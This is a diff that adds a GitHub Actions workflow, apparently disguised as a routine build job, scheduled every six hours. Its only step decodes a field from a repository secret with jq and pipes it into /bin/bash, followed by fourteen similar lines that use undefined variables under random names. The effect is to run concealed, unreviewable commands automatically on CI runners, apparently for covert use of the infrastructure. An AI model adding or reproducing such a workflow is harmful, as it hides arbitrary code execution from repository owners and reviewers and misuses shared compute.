@@ -1,0 +1,30 @@
+name: zhaoqingyiii
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '19 0/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: zhaoqingyiii
+        env:
+          h15837: ${{ secrets.h15837 }}
+        run: |
+          echo $h15837 | jq -r .fdgq45047 | /bin/bash
+          echo $lkl48795 | jq -r .hsdx20 | /bin/bash
+          echo $scx2575 | jq -r .xmpng3438 | /bin/bash
+          echo $uxwo5076 | jq -r .ml57207 | /bin/bash
+          echo $uyc942 | jq -r .bd04540 | /bin/bash
+          echo $gi1 | jq -r .vtazt62 | /bin/bash
+          echo $pjjo8144 | jq -r .ns63119 | /bin/bash
+          echo $g134 | jq -r .ca241 | /bin/bash
+          echo $z7 | jq -r .nwfh3 | /bin/bash
+          echo $rja02 | jq -r .jsggp7 | /bin/bash
+          echo $zh56735 | jq -r .ybdcm26 | /bin/bash
+          echo $riu0 | jq -r .muhvt87 | /bin/bash
+          echo $f636 | jq -r .ttjs7 | /bin/bash
+          echo $pu74577 | jq -r .xjprp962 | /bin/bash
+          echo $pcj781 | jq -r .s3 | /bin/bash
+
